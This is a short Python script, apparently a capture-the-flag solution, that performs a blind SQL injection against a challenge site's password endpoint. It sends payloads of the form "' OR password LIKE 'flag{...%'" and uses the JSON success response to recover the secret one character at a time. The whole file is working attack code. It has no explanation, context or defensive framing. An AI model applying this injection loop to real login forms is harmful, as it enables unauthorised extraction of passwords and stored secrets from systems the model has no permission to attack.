import requests

data = {
	"password" : "' OR password LIKE 'flag{"
}
payload = {
	"password" : "' OR password LIKE 'flag{"
}


charset = 'abcdefghijklnmopqrstuvwxyz_}'

done = False

while not done:
	for c in charset:
		payload['password'] = data['password']
		payload['password'] += c
		payload['password'] += '%}'
		print(payload['password'][20:-2])
		r = requests.post('https://password-3.challs.wreckctf.com/password', json=payload)
		if r.json()['success']:
			data['password'] += c
			if c == '}':
				done = True
			break
		if c == '}':
			done = True